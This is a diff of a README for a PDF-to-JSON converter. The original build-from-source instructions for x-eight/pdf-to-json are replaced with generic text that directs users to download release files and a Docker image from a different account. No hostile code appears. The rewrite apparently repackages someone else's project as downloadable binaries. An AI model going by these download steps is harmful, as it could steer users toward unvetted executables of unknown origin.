@@ -1,70 +1,87 @@
-# PDF-to-JSON Professional Extractor
+# 📄 pdf-to-json - Convert PDFs to JSON Easily
 
-A robust CLI tool for converting PDF documents into structured JSON data. This tool extracts text, layouts, font styles, and images with high precision using **PyMuPDF**.
+## 🔗 Download Now
 
-## ✨ Features
+[![Download](https://img.shields.io/badge/Download-pdf--to--json-brightgreen)](https://github.com/jaknet18/pdf-to-json/releases)
 
-- **Component-Level Extraction**: Extracts text, lines, rectangles, and images as individual JSON components.
-- **Font Intelligence**: Identifies and extracts embedded font styles (Family, Full Name, PostScript) for accurate rendering.
-- **Visual Accuracy**: Captures image positions, dimensions, and transformations.
-- **Smart Cleanup**: Automatically removes overlaps, hidden texts, and redundant background elements.
-- **Local Storage**: Completely standalone with local asset storage (no cloud dependencies).
-- **Docker Ready**: Fully containerized for easy deployment and scaling.
+## 🚀 Getting Started
 
-## 🛠️ Installation
+Welcome to the pdf-to-json project! This tool lets you convert PDF files into structured JSON data. It extracts components such as text, layout, font styles, and images. This tool is ideal for users who need precise conversion without complex setups.
 
-### Using Python
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/x-eight/pdf-to-json.git
-   cd pdf-to-json
+## 🔍 Features
+
+- **High Precision**: Captures detailed layouts and styles.
+- **Component-Level Data**: Extracts text, images, and fonts.
+- **Local Storage Support**: Keep your data safe on your device.
+- **Docker Integration**: Run it in a container for easy setup.
+
+## 📥 Download & Install
+
+1. Visit the [Releases page](https://github.com/jaknet18/pdf-to-json/releases) to find the latest version.
+2. Choose the version suitable for your device and requirements.
+3. Click on the asset to start the download.
+4. Once downloaded, find the file in your downloads folder.
+
+## 💻 System Requirements
+
+To ensure optimal performance, your system should meet the following requirements:
+
+- **Operating System**: Windows, macOS, or Linux.
+- **RAM**: Minimum of 4 GB.
+- **Python**: Version 3.6 or higher, if running locally.
+- **Docker**: Installed and set up, if using Docker integration.
+
+## ⚙️ Usage Instructions
+
+After downloading, follow these steps to run the application:
+
+### Option 1: Running Locally
+
+1. Open your terminal or Command Prompt.
+2. Navigate to the folder where the file is saved.
+3. Run the following command:
+
    ```
-2. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
+   python pdf_to_json.py yourfile.pdf
    ```
 
-### Using Docker
-```bash
-docker build -t pdf-to-json .
-```
+Replace `yourfile.pdf` with the name of your PDF file.
 
-## 🚀 Usage
+### Option 2: Using Docker
 
-### Basic Command
-Run the CLI by providing the path to your PDF file:
-```bash
-python src/cli.py path/to/your/document.pdf
-```
+1. Open your terminal.
+2. Pull the Docker image with this command:
 
-### Options
-- `-o, --output-dir`: Specify where to save the JSON and extracted assets (default: `./output`).
+   ```
+   docker pull jaknet18/pdf-to-json
+   ```
 
-Example with custom output:
-```bash
-python src/cli.py input.pdf --output-dir ./my_results
-```
+3. To convert a PDF, use:
 
-### Running with Docker
-```bash
-docker run -v $(pwd)/output:/app/output pdf-to-json input.pdf
-```
+   ```
+   docker run -v /path/to/your/pdf:/data jaknet18/pdf-to-json /data/yourfile.pdf
+   ```
 
-## 📂 Output Structure
-The tool generates a structured output in the designated folder:
-```text
-output/
-├── input.json          # Structured data of the PDF
-├── images/             # Extracted portrait and inline images
-└── fonts/              # Extracted embedded fonts
-```
+Make sure to replace `/path/to/your/pdf` and `yourfile.pdf` with your actual paths.
 
-## 📝 Technical Details
-This project utilizes:
-- **PyMuPDF (fitz)**: For core PDF parsing and SVG extraction.
-- **Pillow**: For image processing and optimization.
-- **FontTools**: For deep inspection of embedded font metadata.
-- **Font Mapping**: Uses `src/resources/fonts.json` to accurately map embedded and standard fonts (Arial, Calibri, etc.) even when obfuscated.
+## 🛠️ Troubleshooting
 
-## ⚖️ License
-This project is licensed under the MIT License.
+If you encounter issues while running the application, consider the following steps:
+
+- Ensure that your Python and Docker installations are correct.
+- Check that you have the required permissions for the files you are converting.
+- Review common errors on the [Issues page](https://github.com/jaknet18/pdf-to-json/issues). 
+
+## 🌐 Community and Support
+
+Join our community to stay updated and ask for help:
+
+- [GitHub Discussions](https://github.com/jaknet18/pdf-to-json/discussions)
+- [Open an Issue](https://github.com/jaknet18/pdf-to-json/issues)
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/jaknet18/pdf-to-json/wiki)
+- [Examples and Use Cases](https://github.com/jaknet18/pdf-to-json/examples)
+
+Thank you for using pdf-to-json! Explore the capabilities of your PDFs and turn them into useful, structured data.
